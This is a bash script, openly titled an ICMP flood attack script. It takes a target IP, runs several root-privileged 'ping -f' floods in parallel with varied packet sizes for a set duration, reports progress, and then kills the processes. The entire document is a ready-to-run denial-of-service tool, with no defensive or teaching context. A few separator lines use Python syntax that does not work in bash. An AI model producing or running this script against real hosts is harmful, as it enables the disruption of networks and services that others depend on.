#!/bin/bash

# ICMP Flood Attack Script

TARGET="$1"
DURATION="${2:-60}"
PROCESSES="${3:-10}"

if [ -z "$TARGET" ]; then
    echo "Usage: ./icmp_flood.sh <target_ip> [duration] [processes]"
    echo "Example: ./icmp_flood.sh 192.168.1.5 60 10"
    exit 1
fi

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "[!] Warning: ICMP flood requires root privileges"
    echo "[!] Run with: sudo ./icmp_flood.sh $TARGET $DURATION $PROCESSES"
    exit 1
fi

echo "[+] Starting ICMP Flood attack"
echo "[+] Target: $TARGET"
echo "[+] Duration: $DURATION seconds"
echo "[+] Processes: $PROCESSES"
echo "=" * 50

# Start ping processes
PIDS=()
for ((i=1; i<=PROCESSES; i++)); do
    # Vary packet sizes
    size=$(( (i % 4) * 512 + 64 ))
    
    ping -f -s $size "$TARGET" > /dev/null 2>&1 &
    PIDS+=($!)
    echo "[+] Started process $i with size: $size bytes (PID: ${PIDS[-1]})"
done

echo ""
echo "[+] All processes started"
echo "[+] Attack will run for $DURATION seconds"
echo ""
echo "Press Ctrl+C to stop attack early"
echo ""

# Monitor progress
start_time=$(date +%s)
while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
    elapsed=$(( $(date +%s) - start_time ))
    remaining=$(( DURATION - elapsed ))
    
    running=$(ps aux | grep -c "ping.*$TARGET")
    
    echo -ne "\r[+] Time: ${elapsed}s/${DURATION}s | Running processes: ${running}"
    
    sleep 1
done

echo ""
echo ""
echo "[+] Stopping attack..."

# Kill all ping processes
for pid in "${PIDS[@]}"; do
    kill $pid 2>/dev/null
done

pkill -f "ping.*$TARGET" 2>/dev/null

echo "[+] Attack completed"
echo "=" * 50
